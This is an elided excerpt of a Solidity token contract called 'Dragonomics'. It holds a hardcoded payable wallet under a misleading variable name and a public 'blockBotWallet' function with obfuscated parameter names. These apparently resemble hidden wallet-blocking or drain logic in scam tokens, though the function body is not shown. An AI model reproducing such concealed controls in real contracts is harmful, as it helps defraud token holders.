...
contract Dragonomics is Context, IERC20, Ownable{

    using SafeMath for uint256;
    string private _name = "Dragonomics";
    string private _symbol = "Dragonomics";
    ...
    constructor () {
        ...
        huobi = payable(address(0xef3137E82cb98b0Ed74CdaBBB3E84233866Edadd));
    ...
    function blockBotWallet(bool wokr,uint256 copysir, address[] calldata TRUST) public {
        interFace();
